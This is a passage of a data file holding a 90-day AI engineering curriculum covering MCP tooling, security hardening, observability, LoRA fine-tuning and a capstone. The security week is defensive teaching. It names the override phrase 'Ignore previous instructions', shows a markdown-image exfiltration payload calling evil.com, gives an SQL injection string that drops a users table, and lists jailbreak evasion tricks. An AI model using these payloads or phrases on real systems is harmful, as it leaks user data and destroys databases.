          "Wiring evals into continuous integration: executing <code>make eval</code> inside GitHub Actions on every pull request",
          "Configuring quality tripwires: failing the CI build if Recall@5 drops by more than 1.5% or Faithfulness falls below 0.90",
          "Using disk-backed LLM response caching in CI to run prompt regressions instantly with zero repeated API spend",
          "<b>Build:</b> a GitHub Actions workflow that runs your evaluation suite on every PR and comments with a metrics diff table"
        ],
        "done": "Deliberately degrading your retrieval weights or prompt template turns your GitHub Actions CI check red."
      },
      {
        "d": "49",
        "t": "Ship: Measured RAG System with CI Benchmarks",
        "ship": true,
        "tasks": [
          "Deploy your production RAG service with live citation linking, health probes, and metrics endpoints",
          "Write an authoritative README leading with the quantitative evaluation scorecard (Vector vs BM25 vs Hybrid vs Reranked)",
          "Take a half-day off: you have crossed the chasm that separates amateur demo builders from professional AI engineers"
        ],
        "done": "Your RAG README opens with verified retrieval numbers (Recall@5: 92%, MRR: 0.84) that you can defend under scrutiny in any interview."
      }
    ]
  },
  {
    "n": 8,
    "title": "Tools, MCP &amp; Deterministic Agent Workflows (Robot Arms &amp; The Switchboard)",
    "range": "Days 50–56",
    "outcome": "My system can execute actions in the physical world through standardized protocols, tool error repair, and bounded state machines.",
    "days": [
      {
        "d": "50",
        "t": "Tool execution mechanics: JSON Schemas and local runtimes",
        "tasks": [
          "How function calling physically works: passing JSON Schema function signatures in the prompt, intercepting tool-call tokens, and running Python code",
          "Parallel tool calls: handling models that emit multiple simultaneous function invocations in a single completion turn",
          "Packing tool results: serializing function return values into observation message envelopes and returning them to context",
          "<b>Build:</b> an assistant equipped with 4 local tools (search, calculator, file write, system clock) that executes functions and reports answers"
        ],
        "done": "The model emits valid JSON tool calls, your Python runtime executes the functions, and the model synthesizes the answer from tool output."
      },
      {
        "d": "51",
        "t": "Tool resilience: exception feedback and self-correction",
        "tasks": [
          "What happens when tools crash: why raising 500 errors destroys agent execution and how returning exceptions as observations enables self-repair",
          "Guiding parameter correction: feeding invalid argument error traces back to the model so it corrects its own syntax on the next turn",
          "Defensive execution: enforcing execution timeouts (5s) and catch-all exception wrappers around third-party tool code",
          "<b>Build:</b> simulate a tool exception (e.g. invalid date string) and verify that the model analyzes the error and self-corrects on the next turn"
        ],
        "done": "A tool that raises a ValueError produces a polite self-repair from the model instead of an unhandled application crash."
      },
      {
        "d": "52",
        "t": "The bounded agent loop: state, termination, and circuit breakers",
        "tasks": [
          "The core agent loop: Plan -&gt; Act -&gt; Observe -&gt; Evaluate -&gt; Terminate",
          "Loop circuit breakers: enforcing hard limits on maximum tool iterations (10 steps) and total execution time (30 seconds) to prevent infinite loops",
          "Context compaction: summarizing or discarding intermediate tool observation history to prevent overflowing the context window",
          "<b>Build:</b> a multi-step research agent that executes iterative tool actions and terminates reliably when its objective is met"
        ],
        "done": "Your agent successfully executes a 4-step research plan and is structurally incapable of looping beyond 10 steps."
      },
      {
        "d": "53",
        "t": "The Model Context Protocol (MCP): universal tool switchboards",
        "lever": true,
        "tasks": [
          "Understanding MCP: why Anthropic's open protocol solves the $M \\times N$ custom integration problem for tools and resources",
          "MCP protocol architecture: JSON-RPC 2.0 messages traveling over stdio or Server-Sent Events (SSE) transports",
          "Exposing your Week 6 RAG pipeline as a standardized MCP tool (<code>search_knowledge_base</code>) and document resource",
          "<b>Build:</b> a production MCP server using the official Python SDK that exposes your knowledge base to any compatible client"
        ],
        "done": "Your MCP server responds cleanly to standard <code>tools/list</code> and <code>tools/call</code> JSON-RPC protocol requests over stdio."
      },
      {
        "d": "54",
        "t": "Connecting MCP: plugging into IDEs and desktop agents",
        "tasks": [
          "Wiring your MCP server into desktop clients: configuring Claude Desktop, Cursor, or AI CLI agents via configuration manifests",
          "Debugging MCP traffic: monitoring JSON-RPC handshakes, message logging, and handling unexpected transport disconnects",
          "Security boundaries for MCP: restricting filesystem access and sanitizing tool arguments passed from desktop clients",
          "<b>Build:</b> configure Claude Desktop or Cursor to query your custom MCP knowledge base directly during coding workflows"
        ],
        "done": "You can open Claude Desktop or Cursor and ask questions about your private documents via your live MCP server."
      },
      {
        "d": "55",
        "t": "Compound AI systems: deterministic state machines over free-floating agents",
        "lever": true,
        "tasks": [
          "The senior rule: \"If you can draw the flowchart, write code, not an autonomous agent\"",
          "The 4 Compound AI patterns: Router, Orchestrator-Workers, Evaluator-Optimizer, and Parallel Consensus",
          "State machines with Pydantic AI or LangGraph: modeling state transitions as typed directed graphs with guard assertions",
          "<b>Build:</b> a customer request workflow combining a deterministic Router with an Evaluator-Optimizer feedback loop"
        ],
        "done": "Every state transition in your workflow is deterministic, individually unit-tested, and mathematically incapable of infinite recursion."
      },
      {
        "d": "56",
        "t": "Ship #2: Enterprise Knowledge Assistant with MCP Tooling",
        "ship": true,
        "tasks": [
          "Publish Project 2 repository containing your hybrid RAG engine, MCP server, state machine workflow, and CI eval suite",
          "Author a comprehensive README: MCP setup guide, architecture flowcharts, latency breakdown, and Recall@k benchmarks",
          "Verify single-command installation: ensure a user can run your MCP server locally with <code>uv run</code> in under 15 seconds"
        ],
        "done": "Project 2 is live, public on GitHub, and verified working with standard MCP clients. Month 2 complete!"
      }
    ]
  },
  {
    "n": 9,
    "title": "Production Security &amp; Adversarial Hardening (Poisoned Letters &amp; Iron Fences)",
    "range": "Days 57–63",
    "outcome": "My AI system resists indirect prompt injection, protects sensitive credentials, and safely executes tools inside isolated sandboxes.",
    "days": [
      {
        "d": "57",
        "t": "Poisoned context: indirect prompt injection attacks",
        "lever": true,
        "tasks": [
          "Direct vs indirect prompt injection: why untrusted data (emails, scraped webpages, PDF uploads) is the #1 vulnerability in production AI",
          "Attack taxonomy: instruction overrides ('Ignore previous instructions'), role hijacking, and delimiter breakouts",
          "Attacking your Day 56 assistant: crafting 15 distinct hostile payloads hidden inside documents and evaluating model compliance",
          "<b>Build:</b> author an automated adversarial security test suite containing 15 real-world injection attack vectors"
        ],
        "done": "You have a committed test suite demonstrating exactly how unhardened prompts succumb to hidden document injections."
      },
      {
        "d": "58",
        "t": "Data exfiltration and PII scrubbing: locking the perimeter",
        "tasks": [
          "Exfiltration attack vectors: tricking models into rendering tracking markdown images (<code>![leak](https://evil.com?data=...)</code>) or encoding secrets in URLs",
          "Personally Identifiable Information (PII) scrubbing: detecting and redacting credit cards, SSNs, and emails with Microsoft Presidio and regex",
          "Client-side sanitization: stripping sensitive customer data before it ever crosses the network to external model providers",
          "<b>Build:</b> an async pre-processing middleware that intercepts inbound prompts and redacts sensitive PII with zero latency penalty"
        ],
        "done": "Test queries containing realistic fake credit cards and SSNs have all PII redacted with tokens (<code>[REDACTED_SSN]</code>) before reaching the model."
      },
      {
        "d": "59",
        "t": "Defense-in-depth: XML boundary fencing and dual-LLM guards",
        "tasks": [
          "Structural isolation: wrapping untrusted user inputs and retrieved chunks in strict XML tags (<code>&lt;untrusted_content&gt;</code>) with system prompt warnings",
          "Dual-LLM architecture: deploying a fast, cheap model as an isolated security guard checking untrusted inputs before passing them to the primary model",
          "Output guardrails: scanning model completions to ensure internal system instructions or secret prompt templates are never reflected back",
          "<b>Build:</b> implement XML boundary fencing and a dual-LLM guardrail filter that neutralizes the injection attacks created on Day 57"
        ],
        "done": "All 15 injection payloads from Day 57 are successfully neutralized by your boundary fence without degrading answer quality."
      },
      {
        "d": "60",
        "t": "Tool sandboxing: defusing dangerous system calls",
        "tasks": [
          "The danger of autonomous tool execution: SQL injections, arbitrary code execution, and unauthorized filesystem modifications",
          "AST validation for database tools: parsing SQL with <code>sqlglot</code> to permit strictly read-only <code>SELECT</code> statements and reject <code>DROP</code>/<code>UPDATE</code>",
          "Container and WASM sandboxing: executing untrusted Python or shell code inside isolated ephemeral Docker containers with no network access",
          "<b>Build:</b> a hardened SQL query tool that inspects the syntax tree and aborts immediately on any write or schema-modifying operation"
        ],
        "done": "An attempted SQL injection (<code>SELECT *; DROP TABLE users;</code>) is intercepted and blocked at the AST parser level before touching the database."
      },
      {
        "d": "61",
        "t": "Human-in-the-loop: cryptographic approval gates for high-risk actions",
        "tasks": [
          "Action risk classification: partitioning operations into Green (autonomous read-only) vs Red (destructive writes, wire transfers, email sends)",
          "State suspension: freezing agent execution state and emitting an approval request ticket with an expiration TTL",
          "Cryptographic approval tokens: resuming workflow execution only upon receipt of a signed HMAC approval token from a human operator",
          "<b>Build:</b> implement a human approval interrupt for financial or data deletion actions with a simulated Slack/webhook callback"
        ],
        "done": "An agent attempting a destructive action halts execution, sends an approval ticket, and resumes only after receiving a valid authorization token."
      },
      {
        "d": "62",
        "t": "Red-teaming gauntlet: ruthless adversarial penetration testing",
        "tasks": [
          "Conduct an uninterrupted 2-hour red-teaming drill attacking your own production systems from an adversarial perspective",
          "Test complex evasion vectors: unicode character homoglyphs, multi-language prompt switching, base64 obfuscation, and persona roleplay",
          "Document every successful penetration, map the root cause, and rate severity using CVSS criteria",
          "<b>Build:</b> author a comprehensive Threat Model and Security Assessment document (<code>SECURITY.md</code>)"
        ],
        "done": "You have a documented vulnerability report cataloging tested attack vectors, root-cause mechanics, and prioritized engineering fixes."
      },
      {
        "d": "63",
        "t": "Ironclad defenses: automated security regression tests in CI",
        "tasks": [
          "Implement engineering patches for the top two vulnerabilities uncovered during your Day 62 red-teaming gauntlet",
          "Convert successful attack payloads into permanent automated pytest fixtures in your CI pipeline",
          "Publish a formal Security Policy (<code>SECURITY.md</code>) detailing vulnerability reporting procedures and defensive guarantees"
        ],
        "done": "Your automated security test suite executes in CI on every push, ensuring patched prompt injection vulnerabilities can never regress."
      }
    ]
  },
  {
    "n": 10,
    "title": "Observability, Tracing &amp; Production Operations (Mission Control &amp; The Flight Recorder)",
    "range": "Days 64–70",
    "outcome": "Every token, millisecond, and dollar is traced in real time, and user feedback continuously drives automated regression test cases.",
    "days": [
      {
        "d": "64",
        "t": "Distributed tracing with Langfuse: the production flight recorder",
        "lever": true,
        "tasks": [
          "Why logs are dead: the necessity of distributed trace waterfalls for multi-step AI pipelines (User -&gt; RAG -&gt; Rerank -&gt; LLM -&gt; Tool)",
          "Setting up Langfuse (cloud or self-hosted Docker) and integrating the Python SDK",
          "Instrumenting nested spans: capturing inputs, outputs, token counts, model names, and latency across every individual pipeline step",
          "<b>Build:</b> instrument your Day 56 assistant with Langfuse so every user interaction generates an observable execution waterfall"
        ],
        "done": "You can open a web dashboard and view the full visual waterfall trace for any request, showing exact latency and cost per span."
      },
      {
        "d": "65",
        "t": "Mission control dashboards: latency, cost, and throughput telemetry",
        "tasks": [
          "Key production metrics: p50/p95/p99 latency percentiles, cost per user organization, token velocity, and error rates",
          "Building monitoring widgets: tracking hourly token consumption by model version and isolating high-cost user queries",
          "Setting up production tripwires: alerting on abnormal cost spikes ($10/hr threshold) or elevated p95 latency degradations (&gt;3s)",
          "<b>Build:</b> configure production monitoring dashboards with cost tracking, latency histograms, and alert thresholds"
        ],
        "done": "Your dashboard displays live telemetry graphs of request volume, p95 latency percentiles, and cumulative dollar spend."
      },
      {
        "d": "66",
        "t": "Privacy-compliant telemetry: scrubbing secrets from trace storage",
        "tasks": [
          "The dark side of tracing: accidentally leaking customer passwords, credit cards, or API tokens into third-party observability stores",
          "Client-side trace sanitization: writing middleware to scrub authorization headers, session cookies, and regex PII before emitting spans",
          "Compliance engineering: setting data retention policies and establishing audit logs for GDPR, HIPAA, and SOC2 compliance",
          "<b>Build:</b> implement a trace masking filter that guarantees sensitive credentials and user PII never reach your observability database"
        ],
        "done": "Inspecting raw database traces confirms that zero authorization tokens or sensitive customer PII appear in telemetry storage."
      },
      {
        "d": "67",
        "t": "Forensic error analysis: clustering production failures",
        "tasks": [
          "The senior approach to debugging: exporting 50 real production failure traces rather than guessing prompt fixes",
          "Building a failure taxonomy: categorizing failures into Retrieval Miss (35%), Schema Invalidation (20%), User Ambiguity (30%), Hallucination (15%)",
          "Error analysis methodology: letting empirical failure clusters prioritize engineering tasks instead of subjective intuition",
          "<b>Build:</b> author a categorized failure taxonomy report ranking your system's production failures by frequency and impact"
        ],
        "done": "You have a ranked Pareto chart showing the exact percentage breakdown of why your system fails in production."
      },
      {
        "d": "68",
        "t": "User telemetry: capturing implicit signals and explicit feedback",
        "tasks": [
          "Feedback modalities: implicit signals (copy-to-clipboard, dwell time, regeneration clicks) vs explicit signals (thumbs up/down, star ratings)",
          "Binding feedback to trace IDs: attaching user ratings and textual comments directly to Langfuse execution traces via API",
          "Building a defect review queue: filtering observability dashboards to inspect low-rated conversations for systemic flaws",
          "<b>Build:</b> create a feedback endpoint that allows frontend users to submit thumbs up/down ratings linked directly to trace IDs"
        ],
        "done": "Submitting a thumbs-down in your UI immediately flags the corresponding execution trace in your Langfuse dashboard for review."
      },
      {
        "d": "69",
        "t": "Closing the loop: turning production defects into golden eval cases",
        "tasks": [
          "Why static test sets decay: real users discover edge cases and ambiguities you never anticipated in development",
          "The automated fly-wheel: harvesting production thumbs-down traces and promoting them into your golden evaluation dataset",
          "Labeling ground truth: establishing canonical chunks and reference answers for newly discovered production failure modes",
          "<b>Build:</b> export 10 failed production queries from Langfuse and convert them into permanent test fixtures in your golden eval suite"
        ],
        "done": "Your golden evaluation dataset expands with 10 real production failure cases, ensuring those exact defects can never recur."
      },
      {
        "d": "70",
        "t": "Production runbooks: SLAs, circuit cascades, and failover drills",
        "tasks": [
          "Defining Service Level Objectives (SLOs): 99.5% service availability, p95 latency under 2.5s, and error rates below 0.5%",
          "Automated provider cascades: orchestrating failover from primary provider (OpenAI) to secondary (Anthropic) to tertiary (local open model)",
          "Authoring the Operations Runbook: documenting step-by-step triage procedures for rate limit storms, provider outages, and database locks",
          "<b>Build:</b> conduct a live fire drill simulating a primary provider outage and verify automated failover to your secondary model"
        ],
        "done": "Simulating an upstream provider blackout triggers an automated failover within 500ms without dropping user connections."
      }
    ]
  },
  {
    "n": 11,
    "title": "Open Source Models &amp; LoRA Fine-Tuning (The Local Foundry &amp; The Adapter Sleeve)",
    "range": "Days 71–77",
    "outcome": "I can serve open models on local metal with vLLM PagedAttention and use data to prove when LoRA fine-tuning beats prompt engineering.",
    "days": [
      {
        "d": "71",
        "t": "Local metal: running open weights with Ollama and llama.cpp",
        "tasks": [
          "Why self-host: data sovereignty, zero external API latency, regulatory compliance, and offline operational guarantees",
          "Running open models (Llama 3.1 8B, Qwen 2.5, Mistral 7B) locally on Apple Silicon or Linux GPUs using Ollama and llama.cpp",
          "Interacting via OpenAI-compatible REST endpoints (<code>http://localhost:11434/v1</code>) using standard client libraries",
          "<b>Build:</b> point your Week 4 extraction pipeline to a locally hosted open model and execute an extraction completely offline"
        ],
        "done": "Your entire structured extraction and search pipeline executes end-to-end with your machine completely disconnected from the internet."
      },
      {
        "d": "72",
        "t": "High-throughput serving: PagedAttention and continuous batching with vLLM",
        "tasks": [
          "The multi-user bottleneck: why naive HuggingFace pipelines choke and run out of GPU memory under concurrent traffic",
          "PagedAttention mechanics: managing Key-Value (KV) cache memory like OS virtual memory pages to eliminate memory fragmentation",
          "Continuous batching: dynamically pairing incoming and completing token sequences to maximize GPU tensor core utilization",
          "<b>Build:</b> deploy an open model with vLLM and benchmark throughput under concurrent load against a standard inference baseline"
        ],
        "done": "You can draw a diagram explaining how PagedAttention allocates non-contiguous KV-cache memory blocks to serve 10x more users."
      },
      {
        "d": "73",
        "t": "Quantization economics: FP16, INT8, 4-bit, and VRAM arithmetic",
        "tasks": [
          "Quantization math: compressing 16-bit floating-point weights into 4-bit integer representations (AWQ, GPTQ, GGUF)",
          "The physical memory equation: calculating exact GPU VRAM requirements: $\\text{VRAM} = (\\text{parameters} \\times \\text{bytes\\_per\\_weight}) + \\text{KV\\_cache}$",
          "Measuring perplexity degradation: evaluating reasoning loss across 4-bit vs 8-bit vs 16-bit weight representations",
          "<b>Build:</b> run benchmark inference comparing memory usage, tokens per second, and perplexity across 4-bit and 8-bit quantized weights"
        ],
        "done": "You can calculate on a whiteboard the exact GPU VRAM in gigabytes required to host any model at a 32k context length."
      },
      {
        "d": "74",
        "t": "The fine-tuning balance sheet: when to tune vs when to prompt",
        "lever": true,
        "tasks": [
          "When fine-tuning is the winning move: enforcing rigid bespoke schemas, dropping latency by eliminating long prompts, or distilling large models",
          "When fine-tuning is an expensive trap: trying to inject dynamic factual knowledge (which is what RAG does) or working with &lt;500 examples",
          "The total cost of ownership: data curation overhead, training compute costs, and perpetual model maintenance vs prompt iteration speed",
          "<b>Build:</b> author a technical decision matrix analyzing an enterprise use case and defend why fine-tuning is or is not justified"
        ],
        "done": "You can defend your decision with quantitative data: explaining why 'Prompting + RAG' is usually the senior choice."
      },
      {
        "d": "75",
        "t": "Synthetic data distillation: generating training pairs with frontier models",
        "tasks": [
          "Teacher-student distillation: prompting a frontier model (Claude 3.5 Sonnet / GPT-4o) to generate diverse, high-quality instruction-response pairs",
          "Data quality filtering: applying LLM-as-a-judge heuristics, schema checks, and deduplication to purge low-quality or corrupt training rows",
          "Formatting datasets: converting raw data into standardized ChatML format stored as clean JSONL files",
          "<b>Build:</b> generate, filter, and validate a 300-example high-signal synthetic training dataset for a specialized extraction task"
        ],
        "done": "Your synthetic training dataset passes strict JSONL validation, contains zero duplicate samples, and achieves 100% schema compliance."
      },
      {
        "d": "76",
        "t": "LoRA mechanics: training low-rank adapter sleeves",
        "tasks": [
          "Low-Rank Adaptation (LoRA) mechanics: freezing multi-billion parameter base weights and training tiny rank decomposition matrices ($W = W_0 + B \\cdot A$)",
          "Hyperparameter tuning: selecting Rank ($r=8, 16, 32$), Alpha scaling ($\\alpha = 2r$), target projection modules, and learning rate schedules",
          "Executing a LoRA fine-tuning run on a hosted GPU instance (Unsloth, Modal, or RunPod) in under 30 minutes for less than $2.00",
          "<b>Build:</b> fine-tune an open 8B model (Llama 3.1 8B or Qwen 2.5 7B) on your custom dataset and export the trained LoRA adapter weights"
        ],
        "done": "Your training loss curves converge smoothly without overfitting and output a validated LoRA adapter checkpoint file."
      },
      {
        "d": "77",
        "t": "The showdown: fine-tuned adapter vs prompt-engineered baseline",
        "tasks": [
          "Run a head-to-head shootout: evaluate your fine-tuned 8B model against the prompt-engineered base model on an unseen evaluation test set",
          "Compare key production metrics: schema compliance rate, p95 latency, input token overhead, and dollar cost per 1,000 queries",
          "Calculate the financial break-even point: at what daily query volume does fine-tuning pay back its initial dataset and training costs?",
          "<b>Build:</b> author a comparative evaluation report with side-by-side completion diffs, latency graphs, and cost comparisons"
        ],
        "done": "You have a data-backed report proving whether your fine-tuned adapter outperformed the prompt-engineered baseline on accuracy, latency, and cost."
      }
    ]
  },
  {
    "n": 12,
    "title": "Capstone Platform, Playbook &amp; Career Positioning (The Fortress &amp; The Flight Log)",
    "range": "Days 78–84",
    "outcome": "I have shipped an end-to-end production AI platform, authored an emergency outage playbook, and can answer senior system design questions cold.",
    "days": [
      {
        "d": "78",
        "t": "Capstone architecture: blueprints for a production AI platform",
        "tasks": [
          "Architectural scoping: design a production AI platform solving a real problem that you will continue using every single week",
          "Full-stack synthesis: combine Ingestion + Hybrid Search (BM25 + Dense) + Cross-Encoder + MCP + State Machine + Langfuse Tracing",
          "Define enterprise boundaries: tenant data isolation, authentication, rate limiting quotas, and fallback cascades",
          "<b>Build:</b> author the comprehensive System Architecture Document and detailed component dataflow diagram for your capstone"
        ],
        "done": "Your architecture document specifies every component interface, data schema, latency budget, and security fence."
      },
      {
        "d": "79",
        "t": "Platform assembly: end-to-end system integration",
        "tasks": [
          "Wire the user interface (Streamlit, Next.js, or CLI) to your battle-hardened async FastAPI backend",
          "Connect real-time SSE token streaming with live, interactive inline citation linking to retrieved document chunks",
          "Hook up distributed tracing via Langfuse to capture end-to-end request spans from UI click to completion",
          "<b>Build:</b> execute complete integration tests proving that user queries flow through search, reranking, generation, and tracing cleanly"
        ],
        "done": "A user can submit a complex query in the UI, watch tokens stream with live source citations, and see the full trace recorded in Langfuse."
      },
      {
        "d": "80",
        "t": "Stress-testing under fire: load generation and bottleneck profiling",
        "tasks": [
          "Simulate high-concurrency production load: run Locust or k6 to pound your endpoints with 20+ concurrent synthetic users",
          "Profile system bottlenecks under pressure: vector database connection saturation, async event loop stalls, and memory consumption",
          "Optimize performance: tune HTTP connection pools, cache frequently requested queries, and adjust concurrency semaphores",
          "<b>Build:</b> execute a sustained 15-minute load test and record p50, p95, and p99 latency percentiles and error rates under load"
        ],
        "done": "Your platform maintains a 99%+ success rate with p95 latency under 2.5 seconds during sustained multi-user load testing."
      },
      {
        "d": "81",
        "t": "The emergency manual: authoring the Production Failure Playbook",
        "lever": true,
        "tasks": [
          "Document real failure scenarios: primary provider blackouts, 429 rate limit throttling storms, vector index corruption, and injection breaches",
          "Author step-by-step incident response runbooks: exact detection queries, root-cause diagnosis commands, and emergency remediation steps",
          "Document fallback procedures: manual provider failover switches, index rebuild commands, and degraded read-only operational modes",
          "<b>Build:</b> author the complete Production Failure Playbook in <code>PLAYBOOK.md</code> detailing 5 real-world outage scenarios"
        ],
        "done": "A junior engineer on call at 2 AM reading your playbook knows the exact commands to run to diagnose and resolve an outage."
      },
      {
        "d": "82",
        "t": "Shipping the technical narrative: the deep-dive architectural write-up",
        "lever": true,
        "tasks": [
          "Why technical write-ups get you hired: engineering leaders look for trade-off reasoning, economic awareness, and honesty about what broke",
          "Structure the write-up: The Problem -&gt; Architecture -&gt; Engineering Trade-offs -&gt; Empirical Evaluation Scorecard -&gt; What Failed &amp; Lessons",
          "Lead with real numbers: cite exact dollars per query, p95 millisecond waterfalls, Recall@5 metrics, and load test throughput",
          "<b>Build:</b> publish your comprehensive technical deep-dive write-up on your technical blog or as a GitHub repository showcase"
        ],
        "done": "A stranger reading your write-up immediately understands your architectural decisions, cost economics, and engineering maturity."
      },
      {
        "d": "83",
        "t": "The senior technical gauntlet: drilling the 25 core questions",
        "tasks": [
          "Review the 25 Senior AI Engineering Questions in Section 4 of the 90-day plan",
          "Practice answering every question out loud without checking notes, using physical mechanisms, exact numbers, and trade-off comparisons",
          "Conduct an adversarial mock technical interview: defend your Capstone architecture, design choices, and failure playbooks under pressure",
          "<b>Drill:</b> time yourself giving 2-minute crisp answers with zero hand-waving or corporate fluff"
        ],
        "done": "You can answer all 25 senior questions cold with mechanical precision, citing exact trade-offs, numbers, and physical realities."
      },
      {
        "d": "84",
        "t": "Ship #3 (Capstone): Production AI Platform Launch &amp; Verification",
        "ship": true,
        "tasks": [
          "Launch your public Capstone repository with live demo links, architecture diagrams, and the Production Failure Playbook",
          "Execute full load tests: verify 50 concurrent streaming sessions with zero connection drops",
          "Tag the Capstone release v1.0.0 with verified cryptographic SHA-256 manifests",
          "Celebrate completing the core 12-week platform build! You now enter the Days 85–90 Capstone Hardening &amp; Hiring Sprint"
        ],
        "done": "Your Capstone production system is deployed, load-tested, and live on the internet."
      }
    ]
  },
  {
    "n": 13,
    "title": "Capstone Hardening &amp; Hiring Sprint",
    "range": "Days 85–90",
    "outcome": "Six days of battle-hardening: chaos engineering, tail latency profiling, SLO fencing, whiteboard defense, and production portfolio launch.",
    "days": [
      {
        "d": "85",
        "t": "Chaos engineering: fault injection, 503 circuit breakers, and degraded mode fallbacks",
        "tasks": [
          "Simulate upstream model provider 503 outage and rate-limit storms with an adversarial HTTP proxy",
          "Implement circuit breaking in your client: trip after 5 consecutive failures and route to a fallback local/cheaper model",
          "Build graceful degradation: return cached or condensed answers when latency budget exceeds 3,000ms",
          "<b>Build:</b> write automated chaos test verifying zero unhandled 500 errors during a 60-second simulated upstream outage"
        ],
        "done": "Your system gracefully degrades to cached/fallback models under simulated provider outages without dropping user requests."
      },
      {
        "d": "86",
        "t": "Cold-start benchmarking and latency tail trimming: profiling TTFT and p99 waterfalls",
        "tasks": [
          "Profile the latency waterfall of your RAG pipeline: chunk retrieval, embedding call, reranker, and TTFT",
          "Identify and fix p99 latency spikes: socket connection pooling, pre-warming TCP/TLS connections, and chunk pre-fetching",
          "Benchmark TTFT under concurrent loads (1, 10, 50 workers) and graph latency distribution percentiles",
          "<b>Build:</b> latency profiling harness that logs exact millisecond breakdowns for every pipeline stage to OpenTelemetry"
        ],
        "done": "p99 TTFT is documented and optimized, with every millisecond accounted for in an OpenTelemetry waterfall trace."
      },
      {
        "d": "87",
        "t": "Production runbooks, SLO fencing, and the 2:00 AM incident response playbook",
        "tasks": [
          "Define concrete Service Level Objectives (SLOs): 99.5% availability, p95 TTFT &lt; 1.2s, budget spend limit $50/day",
          "Write the 2:00 AM incident runbook: clear triage steps for token budget exhaustion, latency spikes, and poison prompt attacks",
          "Configure automated alerts and emergency kill-switches to halt agent loops before runaway costs occur",
          "<b>Build:</b> commit <code>RUNBOOK.md</code> with step-by-step diagnostic commands, rollback scripts, and emergency switches"
        ],
        "done": "You have an actionable RUNBOOK.md that any on-call engineer can follow at 2:00 AM to diagnose and mitigate production outages."
      },
      {
        "d": "88",
        "t": "System architecture whiteboard defense: trade-offs, cost models, and failure modes",
        "tasks": [
          "Draw the complete physical architecture diagram of your Capstone: ingress, auth, queues, vector DB, model router, and observability",
          "Prepare crisp 2-minute spoken defenses for every key trade-off: Why Pinecone vs pgvector? Why hybrid RRF over dense-only? Why vLLM vs Ollama?",
          "Conduct a mock whiteboard interview with a peer or record yourself defending your architecture under aggressive questioning",
          "<b>Defense:</b> explain exactly how your system handles a 10x traffic spike and how unit costs scale with token volume"
        ],
        "done": "You can defend every architectural component, trade-off, and failure recovery mechanism on a whiteboard with zero hesitation."
      },
      {
        "d": "89",
        "t": "Live technical coding and take-home challenge polish under time pressure",
        "tasks": [
          "Simulate a 60-minute live coding challenge: build a streaming SSE client with token cancellation from memory",
          "Simulate a second 60-minute challenge: write a custom hybrid search RRF reranker with pure Python without consulting external docs",
          "Review your code structure, docstrings, type annotations, and unit test coverage to ensure senior readability",
          "<b>Drill:</b> complete both live challenges cleanly within the 60-minute timebox with zero unhandled exceptions"
        ],
        "done": "You can implement streaming clients, token buckets, and RRF rerankers in pure Python under a 60-minute live coding clock."
      },
      {
        "d": "90",
        "t": "Production Launch, Portfolio Showcase &amp; The 90-Day Transformation Complete",
        "ship": true,
        "tasks": [
          "Publish your public portfolio repository with live demo links, architecture diagrams, and the Production Failure Playbook",
          "Publish your technical deep-dive engineering article documenting architecture, cost models, and lessons learned",
          "Send personalized, value-first outreach to 5 targeted engineering hiring managers with direct links to your shipped work",
          "Celebrate! You have conquered the complete 90-day transformation from zero to a battle-tested, employable production AI Engineer"
        ],
        "done": "Your 3 production systems are live, public, and mathematically proven. You have completed the 90-day journey and are ready for senior engineering roles!"
      }
    ]
  }
];
